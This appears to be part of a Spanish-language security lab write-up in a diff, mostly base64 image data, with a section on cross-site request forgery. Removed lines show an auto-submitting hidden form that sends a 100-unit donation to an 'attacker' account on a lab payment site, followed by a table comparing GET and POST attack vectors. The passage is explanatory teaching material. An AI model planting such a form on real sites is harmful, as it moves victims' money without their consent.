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>
 
-`<form id="csrf_form" action="http://web.pagos/donate.php" method="POST">`
-
-    `<input type="hidden" name="amount" value="100">`
-
-    `<input type="hidden" name="receiver" value="attacker">`
-
-`</form>`
-
-`<script>`
-
-    `document.getElementById('csrf_form').submit();`
-
-`</script>`
-
-Esto hace exactamente lo mismo: crea una petición POST válida y la envía en nombre del usuario sin que él haga nada. Así que cambiar a POST no arregla el CSRF.
-
-| GET | Enlace \<a\> (Botón Profile) | Requiere Clic |
-| :---- | :---- | :---- |
-| GET | Etiqueta \<img\> | Cero Interacción (Automático al cargar) |
-| POST | Formulario oculto \+ JS | Cero Interacción (Automático al cargar) |
-
+[image4]: <data:image/png;base64,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